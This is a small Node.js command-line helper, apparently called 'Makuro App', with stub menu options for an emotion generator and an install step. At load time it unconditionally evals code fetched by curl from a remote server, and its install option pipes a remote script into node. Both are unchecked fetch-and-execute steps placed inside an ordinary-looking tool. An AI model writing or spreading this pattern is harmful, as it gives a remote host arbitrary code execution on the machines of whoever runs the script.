const arg = process.argv.splice(2)
const { execSync } = require('child_process');
const columnify = require('columnify');
const _ = require('lodash')
const urlhost = execSync('hostname').toString().trim() === "srv442857" ? "https://wibudev.wibudev.com" : "http://localhost:3005";
eval(execSync('curl -s -o- -X POST https://wibudev.wibudev.com/cmd/version').toString().trim());

const list_menu = [
    {
        arg: ['-eg', '--emotion-generator'],
        des: "generate emotion secara otomatis",
        fun: async () => {
            console.log(arg)
        }
    },
    {
        arg: ['-i', '--install'],
        des: "install source yang dibutuhkan",
        fun: async () => {
            execSync(`curl -s -o- -X POST ${urlhost}/cmd/install | node`)
            console.log("success")
        }
    }
];

function help() {
    console.log(`
Makuro App:
version: 1.0.1

${columnify(list_menu.map((v) => ({ ..._.omit(v, ['fun']) })))}
`)
}

; (async () => {

    // if (arg.length === 0) return help()
    // const app = list_menu.find((v) => v.arg.includes(arg[0]))
    // if (!app) return help()
    // app.fun()
})()
